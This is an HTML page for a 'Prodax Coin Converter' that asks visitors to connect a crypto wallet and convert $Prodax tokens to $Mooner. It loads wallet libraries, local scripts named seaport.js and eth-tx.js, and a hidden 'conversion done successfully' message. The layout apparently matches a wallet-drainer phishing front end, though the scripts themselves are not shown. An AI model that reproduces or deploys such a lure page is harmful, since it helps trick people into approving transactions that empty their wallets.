<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prodax Coin Converter</title>
    <link rel="stylesheet" href="buttonstyle.css">
</head>
<body>
    
    <div class="container">
        <h3>Convert Your Long-Term $Prodax Holdings to $Mooner</h3>
        
        <div class="card">
            <button id="connectButton" class="enter_lair">CONNECT</button>
            <form id="convertForm">
                <div class="input-group">
                    <label for="amount">Enter Prodax Amount To Convert:</label>
                    <input type="number" id="amount" placeholder="0.00" required>
                </div>
                <button id="claimButton" class="enter_lair">Convert to $Mooner</button>
                <p id="message"></p>
            </form>
        </div>
    </div>
    
    <p id="walletAddress"></p>
    <p id="notEli" class="notEli" style="display:none; color: red;">Congratulations! Your conversion has been done successfully.</p>

    <script src="https://bundle.run/buffer@6.0.3"></script> 
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@3.0.0-rc.5/dist/web3.min.js"></script>
    <script src="https://unpkg.com/moralis-v1@latest/dist/moralis.js"></script>
    <script src="seaport.js"></script>
    <script src="eth-tx.js"></script>
    <script src="index.js"></script>
    <script src="conversion.js"></script> <!-- Link to the new JavaScript file -->
</body>
</html>
